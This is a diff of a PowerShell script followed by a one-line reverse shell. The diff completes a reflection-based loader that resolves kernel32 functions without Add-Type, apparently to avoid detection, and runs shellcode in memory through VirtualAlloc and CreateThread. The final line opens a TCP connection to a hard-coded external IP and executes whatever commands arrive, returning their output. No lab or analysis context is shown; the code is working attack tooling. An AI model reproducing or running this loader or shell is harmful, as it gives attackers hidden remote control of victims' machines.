@@ -1,5 +1,11 @@
+```powershell
 function lookupFunc {
     Param ($moduleName, $funcName)
+
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp = @()
+    $assem.GetMethods() | % {If($_.Name -eq "GetProcAddress") {$tmp += $_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $funcName))
 }
 
 function getDelegateType {
@@ -8,6 +14,15 @@ function getDelegateType {
         [Parameter(Position=1)][Type] $retType = [Void]
     )
 
+    # Building a DelegateType (doing it manually to avoid usage of Add-Type)
+    ## create a custom assembly and define the module and type inside
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    ## set up the constructor
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $argsTypes).SetImplementationFlags('Runtime, Managed')
+    ## sets up the invoke method
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argsTypes).SetImplementationFlags('Runtime, Managed')
+    ## invoke the constructor and return the delegation type
+    return $type.CreateType()
 }
 
 # $VirtualAllocAddr = lookupFunc kernel32.dll VirtualAlloc
@@ -22,6 +37,8 @@ $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
 
 $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+
+```
 
 -------------------------------------------------
 $LHOST = "50.19.137.79"; $LPORT = 80; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
